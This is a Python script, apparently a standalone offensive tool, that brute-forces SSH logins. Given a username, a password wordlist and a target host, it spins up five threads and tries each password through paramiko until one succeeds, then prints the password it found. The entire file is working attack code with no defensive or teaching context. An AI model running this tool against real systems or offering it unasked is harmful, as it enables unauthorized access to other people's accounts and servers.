import threading
import paramiko
import socket
import argparse
from queue import Queue
import sys
import time

queue = Queue()
found = False

#Checks if the specified port is open before attempting to brute force
def check_port(target_ip, target_port):

	try:

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target_ip, target_port))
		print(f"[+] Port {target_port} is open! Beginning brute force...")
		return True

	except:

		print(f"[-] Port {target_port} is closed! Terminating...")
		return False



#Attempts to connect to the target host via SSH using the first password in the queue
def check_pass(target_ip, username):

	global found

	while not found and not queue.empty():

		password = queue.get()
		ssh_client = paramiko.SSHClient()
		ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

		try:
			
			ssh_client.connect(target_ip, port=22, username=username, password=password)
			print(f"[+] Found password: {password}")
			found = True

		except Exception as e:

			ssh_client.close()

			if "Error reading SSH protocol banner" in str(e):

				time.sleep(10)
				check_pass(target_ip, username)

			else:

				print(f"[-] Tried password: {password}")


def main():

	parser = argparse.ArgumentParser()
	parser.add_argument("-u", dest="user", help="Specify the username you want to brute-force.")
	parser.add_argument("-p", dest="password_file", help="Specify the password list to use for the brute-force.")
	parser.add_argument("-H", dest="host", help="Specify the hostname or IP address of your target.")


	if len(sys.argv) != 7:

		parser.print_help(sys.stderr)
		sys.exit(1)

	args = parser.parse_args()

	host = args.host
	password_file = args.password_file
	user = args.user

	file = open(password_file, "r")

	for password in file:
		queue.put(password.strip("\n"))

	thread_list = []

	for _ in range(0,5):
		t = threading.Thread(target=check_pass, args=(host, user))
		thread_list.append(t)

	for t in thread_list:
		t.start()

	for t in thread_list:
		t.join()

	print("[!] Brute force complete!")


if __name__ == "__main__":

	main()
